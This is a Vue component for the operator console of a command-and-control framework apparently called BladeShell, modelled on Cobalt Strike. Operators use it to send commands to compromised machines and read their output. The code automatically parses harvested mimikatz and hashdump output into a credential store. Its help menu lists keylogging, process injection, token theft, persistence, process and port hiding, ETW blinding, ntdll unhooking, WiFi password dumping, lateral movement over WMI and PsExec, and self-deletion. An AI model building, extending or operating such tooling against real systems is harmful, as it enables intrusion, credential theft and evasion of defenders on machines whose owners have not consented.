<template>
  <div class="beacon-console cs-font-ui">
    <!-- 顶部状态信息条 (CS 经典会话状态栏) -->
    <div class="bc-header">
      <div class="bc-status-group">
        <span class="bc-dot" :class="online ? 'online' : 'offline'" />
        <span class="bc-host">{{ host }}</span>
        <span class="bc-user" :class="{ 'is-admin': isAdmin }">
          {{ user }}{{ isAdmin ? ' *' : '' }}
        </span>
      </div>

      <div class="bc-meta-group">
        <span class="bc-meta-pill"><span class="pill-k">PID</span><b>{{ pid }}</b></span>
        <span class="bc-meta-pill"><span class="pill-k">Arch</span><b>{{ arch }}</b></span>
        <span class="bc-meta-pill"><span class="pill-k">IP</span><b>{{ ip }}</b></span>
        <span class="bc-meta-pill"><span class="pill-k">{{ isZh ? '监听器' : 'Lis' }}</span><b>{{ listener }}</b></span>
        <span class="bc-meta-pill"><span class="pill-k">{{ isZh ? '心跳' : 'Sleep' }}</span><b>{{ sleep }}</b></span>
      </div>

      <div class="bc-spacer" />

      <!-- Quick Action Buttons -->
      <div class="bc-quick-actions">
        <button class="bc-action-btn" :title="isZh ? '打开文件浏览器' : 'Open File Browser'" @click="openFiles">{{ isZh ? '文件' : 'Files' }}</button>
        <button class="bc-action-btn" :title="isZh ? '打开进程列表' : 'Open Process List'" @click="openPids">{{ isZh ? '进程' : 'Processes' }}</button>
        <button class="bc-action-btn" :title="isZh ? '打开屏幕截图' : 'Open Screenshots'" @click="openScreenshots">{{ isZh ? '截图' : 'Screenshots' }}</button>
        <button class="bc-action-btn" :title="isZh ? '快速心跳 5 秒' : 'Quick Sleep 5s'" @click="sendSleep(5, 10)">{{ isZh ? '心跳 5s' : 'Sleep 5s' }}</button>
        <button class="bc-action-btn" :title="isZh ? '任务队列' : 'Task Queue'" @click="openTaskQueue">{{ isZh ? '任务' : 'Tasks' }}</button>
        <button class="bc-action-btn" :title="isZh ? '导出会话输出' : 'Export Session Output'" @click="exportOutput">{{ isZh ? '导出' : 'Export' }}</button>
        <button class="bc-action-btn" :title="isZh ? '清空控制台' : 'Clear Console'" @click="clearTerminal">{{ isZh ? '清空' : 'Clear' }}</button>
      </div>

      <span class="bc-last" :class="online ? 'ok' : 'err'">{{ online ? (isZh ? '● 在线' : '● Online') : (isZh ? '○ 离线' : '○ Offline') }}</span>
    </div>

    <!-- Terminal Surface (xterm.js) -->
    <div ref="termEl" class="bc-term" />

    <!-- Bottom Input Bar -->
    <div class="bc-input-row">
      <span class="bc-prompt">beacon&gt;</span>
      <input
        ref="inputEl"
        v-model="input"
        class="bc-input"
        :placeholder="isZh ? '输入 beacon 命令，按回车执行，上下方向键浏览历史...' : 'Type beacon command, press Enter to execute, Up/Down for history...'"
        autocomplete="off"
        spellcheck="false"
        @keydown="onKeydown"
      />
      <button class="bc-send-btn" @click="send">{{ isZh ? '运行' : 'Run' }}</button>
    </div>

    <!-- 任务队列可视化对话框 -->
    <el-dialog
      v-model="taskDialogVisible"
      :title="isZh ? '任务队列: ' + props.uid.slice(0, 8) : 'Task Queue: ' + props.uid.slice(0, 8)"
      width="560px"
      append-to-body
      class="cs-dialog"
      :close-on-click-modal="false"
    >
      <div class="tq-container cs-font-ui">
        <div class="tq-toolbar">
          <div class="tq-stats">
            <span class="tq-stat">{{ isZh ? '队列中:' : 'Queued:' }} <b>{{ taskQueue.queue_len || 0 }}</b></span>
            <span class="tq-stat">{{ isZh ? '记录:' : 'Records:' }} <b>{{ (taskQueue.commands || []).length }}</b></span>
            <span class="tq-stat">{{ isZh ? '最后拉取:' : 'Last pull:' }} <b>{{ taskQueue.last_pull_at || '-' }}</b></span>
          </div>
          <button class="cs-btn cs-btn-xs" @click="refreshTaskQueue">{{ isZh ? '刷新' : 'Refresh' }}</button>
        </div>
        <div v-if="(taskQueue.queue_len || 0) > 0" class="tq-warn">
          {{ isZh ? `⚠ 服务端仍有 ${taskQueue.queue_len} 条命令待客户端取走(可能离线或心跳慢)` : `⚠ ${taskQueue.queue_len} command(s) still queued on server (offline or slow heartbeat)` }}
        </div>
        <el-table :data="taskQueue.commands || []" size="small" height="320" class="cs-session-table">
          <el-table-column prop="sent_at" label="时间" width="150">
            <template #default="{ row }">
              <span class="mono-cell">{{ fmtTime(row.sent_at) }}</span>
            </template>
          </el-table-column>
          <el-table-column prop="command" label="命令" min-width="240" show-overflow-tooltip>
            <template #default="{ row }">
              <span class="mono-cell">{{ row.command }}</span>
            </template>
          </el-table-column>
          <el-table-column prop="status" label="状态" width="90" align="center">
            <template #default="{ row }">
              <span :class="row.status === 'removed' ? 'tq-removed' : 'tq-queued'">
                {{ row.status === 'removed' ? (isZh ? '已取走' : 'Taken') : (isZh ? '待取' : 'Queued') }}
              </span>
            </template>
          </el-table-column>
        </el-table>
        <div class="tq-hint">{{ isZh ? '状态为近似值(协议无逐命令回执);命令执行结果见控制台输出。' : 'Status is approximate (no per-command ACK); results appear in the console.' }}</div>
      </div>
    </el-dialog>
  </div>
</template>

<script setup lang="ts">
import { computed, watch, onBeforeUnmount, onMounted, ref } from 'vue'
import { Terminal } from 'xterm'
import { FitAddon } from 'xterm-addon-fit'
import { WebLinksAddon } from 'xterm-addon-web-links'
import 'xterm/css/xterm.css'
import { useClientsStore } from '@/stores/clients'
import { useI18nStore } from '@/stores/i18n'
import { useCommandHistoryStore } from '@/stores/shellcommand'
import { useWorkspaceStore } from '@/stores/workspace'
import ClientAPI from '@/api/clients'
import { ElMessage } from 'element-plus'

import { useCredentialsStore } from '@/stores/credentials'

const props = defineProps<{ uid: string }>()

const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const clientsStore = useClientsStore()
const historyStore = useCommandHistoryStore()
const workspace = useWorkspaceStore()
const credsStore = useCredentialsStore()

const termEl = ref<HTMLElement | null>(null)
const taskDialogVisible = ref(false)
const taskQueue = ref<any>({ commands: [] })
let taskTimer: number | null = null

async function refreshTaskQueue() {
  if (!props.uid) return
  try {
    const res = await ClientAPI.get_client_task_queue(props.uid)
    taskQueue.value = res?.data?.data || { commands: [] }
  } catch { /* 忽略 */ }
}

function openTaskQueue() {
  taskDialogVisible.value = true
  refreshTaskQueue()
  taskTimer = window.setInterval(refreshTaskQueue, 5000)
}

watch(taskDialogVisible, (v) => {
  if (!v && taskTimer) {
    window.clearInterval(taskTimer)
    taskTimer = null
  }
})

function fmtTime(t: string) {
  if (!t) return '-'
  return t
}

const inputEl = ref<HTMLInputElement | null>(null)
const input = ref('')

let terminal: Terminal | null = null
let fitAddon: FitAddon | null = null
let lastLen = 0
let pollTimer: ReturnType<typeof setInterval> | null = null

const client = computed(() => clientsStore.getClientByUid(props.uid))
const online = computed(() => client.value?.Online === '1')
const host = computed(() => client.value?.Computer || props.uid.slice(0, 8))
const user = computed(() => client.value?.Username || 'unknown')
const pid = computed(() => client.value?.Pid || '-')
const arch = computed(() => client.value?.Arch || '-')
const ip = computed(() => client.value?.ExternalIP || client.value?.InternalIP || '-')
const listener = computed(() => client.value?.Listener || '-')
const sleep = computed(() => client.value?.Sleep || '5')

const isAdmin = computed(() => {
  const u = user.value.toLowerCase()
  return u.includes('system') || u.includes('admin') || u.includes('root') || u.includes('administrator')
})

const timestamp = () => new Date().toLocaleTimeString('en-GB')

function writeLine(text: string) {
  terminal?.writeln(text)
}

function printHelp() {
  writeLine('\r\n\x1b[1;37mBeacon Commands\x1b[0m')
  writeLine('\x1b[1;37m===============\x1b[0m')
  writeLine('    \x1b[36mCommand\x1b[0m                   \x1b[36mDescription\x1b[0m')
  writeLine('    \x1b[37m-------\x1b[0m                   \x1b[37m-----------\x1b[0m')
  writeLine('    cd <dir>                  Change directory')
  writeLine('    clear                     Clear console (local)')
  writeLine('    download <file>           Download a file from target')
  writeLine('    drives                    List drives on target')
  writeLine('    execute <cmd>             Execute program on target')
  writeLine('    exit                      Terminate the beacon process')
  writeLine('    filebrowse <dir>          List directory entries')
  writeLine('    filecontent <file>        Read file content on target')
  writeLine('    help                      Display this help menu')
  writeLine('    inject <pid> [tech]      In-memory inject new beacon into process (auto|ntc|apc|crt)')
  writeLine('    keylog_start              Start keystroke logger')
  writeLine('    keylog_get                Pull recorded keystrokes')
  writeLine('    keylog_stop               Stop keystroke logger')
  writeLine('    kill <pid>                Kill a process')
  writeLine('    ls [dir]                  List files (shell)')
  writeLine('    mkdir <dir>               Make directory')
  writeLine('    mv/cp <a> <b>             Move / copy file')
  writeLine('    persist <method> [name]   Persistence: registry|schtasks|startup|cron|bashrc')
  writeLine('    ps                        Show process list')
  writeLine('    pwd                       Print current working directory')
  writeLine('    reg_query <path>          Query Windows registry key')
  writeLine('    rm <path>                 Remove file or directory')
  writeLine('    services                  List services')
  writeLine('    service_start <name>      Start a service')
  writeLine('    service_stop <name>       Stop a service')
  writeLine('    shell <cmd>               Execute via cmd.exe / bash')
  writeLine('    sleep <sec> <jit>         Set sleep time & jitter')
  writeLine('    wmi_exec / psexec <..>    Remote exec via WMI/PsExec (file-less)')
  writeLine('    winrm_exec <..>           Remote exec via WinRM')
  writeLine('    make_token <u>|<p>|<d>    Create & impersonate token')
  writeLine('    steal_token <pid>         Steal & impersonate token')
  writeLine('    rev2self                  Revert to original token')
  writeLine('    ad_enum                   Active Directory enumeration')
  writeLine('    wmi_persist               WMI persistence install')
  writeLine('    hideprocess [on/off]      Masquerade process name (Linux)')
  writeLine('    hidenet <on/off> <port>   Hide listening port (Linux)')
  writeLine('    selfdelete                Unlock & delete beacon binary (stay online)')
  writeLine('    selfdelete_exit           Delete beacon binary and exit')
  writeLine('    etw_patch / unhook_ntdll  Blind ETW / restore ntdll hooks')
  writeLine('    sandbox_check / antidebug Sandbox probe / anti-debug')
  writeLine('    clipboard                 Dump clipboard content')
  writeLine('    wifi                      Dump stored WiFi passwords')
  writeLine('    psexec/wmi/ad_enum/persist  See Client Tools & Startup panels')
  writeLine('    ')
  writeLine('    \x1b[2m(mimikatz / hashdump / net / portscan / powershell / screenshots / upload)\x1b[0m')
  writeLine('    \x1b[2m以上命令无专用通道，将以系统 shell 方式执行；截图与上传请用界面按钮。\x1b[0m\r\n')
}

// 导出会话输出（shell 历史）
async function exportOutput() {
  if (!props.uid) return
  try {
    const res = await ClientAPI.get_shellcontent({ uid: props.uid })
    const raw: string = res.data?.data ?? ''
    const blob = new Blob([raw], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `beacon_${props.uid.slice(0, 8)}_${Date.now()}.log`
    a.click()
    URL.revokeObjectURL(url)
  } catch {
    writeLine('\x1b[91m[-] Export failed\x1b[0m')
  }
}

async function fetchContent() {
  if (!props.uid) return
  try {
    const res = await ClientAPI.get_shellcontent({ uid: props.uid })
    const raw: string = res.data?.data ?? ''
    if (raw.length < lastLen) {
      lastLen = raw.length
      return
    }
    if (raw.length > lastLen) {
      const tail = raw.slice(lastLen)
      lastLen = raw.length
      if (tail.trim()) {
        writeLine(`\x1b[90m[${timestamp()}]\x1b[0m`)
        terminal?.write(tail.replace(/\n$/, ''))
        terminal?.write('\r\n')

        // Auto parse harvested credentials
        if (tail.includes('Domain') && tail.includes('Password')) {
          credsStore.parseMimikatzOutput(tail, host.value, props.uid)
        } else if (tail.includes(':500:') || tail.includes(':1000:')) {
          credsStore.parseHashdumpOutput(tail, host.value, props.uid)
        }
      }
    }
  } catch {}
}

async function send() {
  const cmd = input.value.trim()
  if (!cmd || !props.uid) return
  input.value = ''
  historyStore.addCommand(props.uid, cmd)
  historyStore.clearCurrentIndex(props.uid)

  writeLine(`\x1b[36mbeacon>\x1b[0m ${cmd}`)

  if (cmd.toLowerCase() === 'help') {
    printHelp()
    return
  }

  try {
    const res = await ClientAPI.send_commands({ uid: props.uid, command: cmd })
    // CNA alias 命令：脚本引擎在服务端执行，输出直接回显控制台
    const aliasOut = res?.data?.data?.alias ? res.data.data.output : null
    if (Array.isArray(aliasOut) && aliasOut.length > 0) {
      for (const line of aliasOut) {
        writeLine('\x1b[33m' + line + '\x1b[0m')
      }
      return
    }
    const aliasErr = res?.data?.error
    if (aliasErr) {
      writeLine('\x1b[91m[-] ' + aliasErr + '\x1b[0m')
    }
  } catch {
    writeLine('\x1b[91m[-] Command execution failed\x1b[0m')
  }
  setTimeout(fetchContent, 350)
}

async function sendSleep(sec: number, jit: number) {
  const cmd = `sleep ${sec} ${jit}`
  writeLine(`\x1b[36mbeacon>\x1b[0m ${cmd}`)
  try {
    await ClientAPI.send_commands({ uid: props.uid, command: cmd })
    clientsStore.updateClient(props.uid, { Sleep: `${sec} ${jit}%` })
    ElMessage.success(`Sleep set to ${sec}s`)
  } catch {
    writeLine('\x1b[91m[-] Failed to set sleep\x1b[0m')
  }
}

function clearTerminal() {
  terminal?.clear()
  ClientAPI.send_commands({ uid: props.uid, command: 'clear' }).catch(() => {})
}

function onKeydown(e: KeyboardEvent) {
  if (e.key === 'Enter') {
    e.preventDefault()
    send()
  } else if (e.ctrlKey && e.key.toLowerCase() === 'l') {
    e.preventDefault()
    clearTerminal()
  } else if (e.key === 'ArrowUp') {
    e.preventDefault()
    const prev = historyStore.getPrevCommand(props.uid)
    if (prev !== undefined) input.value = prev
  } else if (e.key === 'ArrowDown') {
    e.preventDefault()
    const next = historyStore.getNextCommand(props.uid)
    input.value = next ?? ''
  }
}

function openFiles() {
  workspace.openTab({
    id: `files:${props.uid}`,
    title: isZh.value ? `文件管理: ${host.value}` : `Files: ${host.value}`,
    component: 'client-files',
    params: { uid: props.uid },
  })
}

function openPids() {
  workspace.openTab({
    id: `pids:${props.uid}`,
    title: isZh.value ? `进程列表: ${host.value}` : `Processes: ${host.value}`,
    component: 'client-pids',
    params: { uid: props.uid },
  })
}

function openScreenshots() {
  workspace.openTab({
    id: `screenshots:${props.uid}`,
    title: isZh.value ? `屏幕截图: ${host.value}` : `Screenshots: ${host.value}`,
    component: 'client-screenshots',
    params: { uid: props.uid },
  })
}

function fit() {
  fitAddon?.fit()
}

onMounted(() => {
  terminal = new Terminal({
    fontFamily: "'JetBrains Mono', Consolas, Menlo, Monaco, monospace",
    fontSize: 19,
    lineHeight: 1.25,
    cursorBlink: true,
    // 后端 shell 历史为 Unix 风格裸 \n（LF）；convertEol 让 LF 自动转 CRLF，
    // 否则光标停留在上一行结束的列，多行输出逐行右移成"阶梯状"残影（与交互终端保持一致）
    convertEol: true,
    scrollback: 10000,
    theme: {
      background: '#0a0a0a',
      foreground: '#d4d4d4',
      cursor: '#007acc',
      cursorAccent: '#000000',
      selectionBackground: '#007acc44',
      black: '#000000',
      red: '#f44336',
      green: '#4caf50',
      yellow: '#ffc107',
      blue: '#007acc',
      magenta: '#b388ff',
      cyan: '#4dd0e1',
      white: '#e0e0e0',
    },
  })
  fitAddon = new FitAddon()
  terminal.loadAddon(fitAddon)
  terminal.loadAddon(new WebLinksAddon())

  if (termEl.value) {
    terminal.open(termEl.value)
    fitAddon.fit()
  }

  // CS Banner Header
  writeLine(`\x1b[1;36mBladeShell Beacon\x1b[0m — ${host.value} (${ip.value})`)
  writeLine(`\x1b[90m[*] User: ${user.value} | PID: ${pid.value} | Arch: ${arch.value} | Listener: ${listener.value}\x1b[0m`)
  writeLine(`\x1b[90m[${timestamp()}] Session interactive console ready.\x1b[0m\r\n`)
  writeLine(`\x1b[90m[${timestamp()}] ${isZh.value ? '非交互式 shell：命令与功能操作结果将自动回显到此处。' : 'Non-interactive shell: command and operation results are echoed here.'}\x1b[0m`)

  if (!clientsStore.clientsList.length) {
    clientsStore.refreshClients().catch(() => {})
  }
  fetchContent()
  pollTimer = setInterval(fetchContent, 3000)
  inputEl.value?.focus()

  window.addEventListener('resize', fit)
})

onBeforeUnmount(() => {
  if (pollTimer) clearInterval(pollTimer)
  window.removeEventListener('resize', fit)
  terminal?.dispose()
  terminal = null
})
</script>

<style scoped>
.beacon-console {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: #0a0a0a;
  overflow: hidden;
}

/* Header Bar */
.bc-header {
  display: flex;
  align-items: center;
  gap: 14px;
  height: 36px;
  padding: 0 12px;
  background: var(--cs-titlebar-bg);
  border-bottom: 1px solid var(--cs-border);
  color: var(--cs-text);
  font-size: 16px;
  flex-shrink: 0;
  user-select: none;
}
.bc-status-group {
  display: flex;
  align-items: center;
  gap: 8px;
}
.bc-dot {
  width: 9px;
  height: 9px;
  border-radius: 50%;
}
.bc-dot.online {
  background: var(--cs-online);
  box-shadow: 0 0 4px var(--cs-online);
}
.bc-dot.offline {
  background: var(--cs-offline);
}
.bc-host {
  color: var(--cs-text-bright);
  font-weight: 600;
  font-size: 17px;
}
.bc-user {
  color: var(--cs-text);
  font-family: var(--cs-font-mono);
}
.bc-user.is-admin {
  color: #f44336;
  font-weight: 600;
}
.bc-meta-group {
  display: flex;
  align-items: center;
  gap: 6px;
  font-family: var(--cs-font-mono);
}
.bc-meta-pill {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  background: var(--cs-bg);
  border: 1px solid var(--cs-border);
  padding: 1px 6px;
  border-radius: 2px;
  font-size: 12.5px;
}
.pill-k {
  color: var(--cs-text-dim);
  font-size: 11px;
  text-transform: uppercase;
}
.bc-meta-pill b {
  color: var(--cs-text-bright);
}
.bc-spacer { flex: 1; }

.bc-quick-actions {
  display: flex;
  align-items: center;
  gap: 6px;
}
.bc-action-btn {
  background: var(--cs-panel);
  border: 1px solid var(--cs-border);
  border-radius: 2px;
  color: var(--cs-text);
  font-size: 15px;
  padding: 2px 8px;
  cursor: pointer;
}
.bc-action-btn:hover {
  background: var(--cs-hover);
  color: var(--cs-text-bright);
  border-color: var(--cs-active);
}
.bc-last.ok { color: var(--cs-online); font-weight: 500; }
.bc-last.err { color: var(--cs-offline); }

/* Terminal Surface */
.bc-term {
  flex: 1;
  min-height: 0;
  padding: 6px 0 0 8px;
  background: #0a0a0a;
}
.bc-term :deep(.xterm) {
  height: 100%;
}
.bc-term :deep(.xterm-viewport) {
  background: #0a0a0a;
}

/* Input Bar */
.bc-input-row {
  display: flex;
  align-items: center;
  gap: 10px;
  height: 40px;
  padding: 0 12px;
  background: #141414;
  border-top: 1px solid var(--cs-border);
  flex-shrink: 0;
}
.bc-prompt {
  color: #007acc;
  font-family: 'JetBrains Mono', Consolas, monospace;
  font-size: 19px;
  font-weight: 600;
}
.bc-input {
  flex: 1;
  background: transparent;
  border: 0;
  outline: 0;
  color: #f0f0f0;
  font-family: 'JetBrains Mono', Consolas, monospace;
  font-size: 18px;
}
.bc-input::placeholder {
  color: #555;
  font-family: var(--cs-font-ui);
}
.bc-send-btn {
  background: var(--cs-active);
  border: 0;
  border-radius: 2px;
  color: #fff;
  font-size: 16px;
  padding: 4px 14px;
  cursor: pointer;
}
.bc-send-btn:hover {
  background: #1a8cd8;
}
</style>
